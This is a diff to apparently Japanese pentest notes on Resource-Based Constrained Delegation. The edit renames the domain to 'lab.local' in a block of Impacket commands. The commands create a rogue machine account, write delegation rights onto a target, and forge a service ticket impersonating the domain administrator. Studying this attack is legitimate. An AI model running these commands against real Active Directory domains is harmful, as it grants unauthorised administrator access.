@@ -25,13 +25,13 @@ RBCD（Resource-Based Constrained Delegation）は、委任の許可をリソー
 
 ```
 # 1. マシンアカウント作成
-addcomputer.py corp.local/user:'Password123' -computer-name 'EVIL$' -computer-pass 'Evil123!' -dc-ip <DC_IP>
+addcomputer.py lab.local/user:'Password123' -computer-name 'EVIL$' -computer-pass 'Evil123!' -dc-ip <DC_IP>
 
 # 2. RBCD 設定
-rbcd.py -delegate-to 'TARGET$' -delegate-from 'EVIL$' -dc-ip <DC_IP> -action write corp.local/user:'Password123'
+rbcd.py -delegate-to 'TARGET$' -delegate-from 'EVIL$' -dc-ip <DC_IP> -action write lab.local/user:'Password123'
 
 # 3. S4U で administrator になりすまし TGS を取得
-getST.py -spn 'cifs/target.corp.local' -impersonate administrator -dc-ip <DC_IP> corp.local/'EVIL$':'Evil123!'
+getST.py -spn 'cifs/target.lab.local' -impersonate administrator -dc-ip <DC_IP> lab.local/'EVIL$':'Evil123!'
 ```
 
 ## 注意点
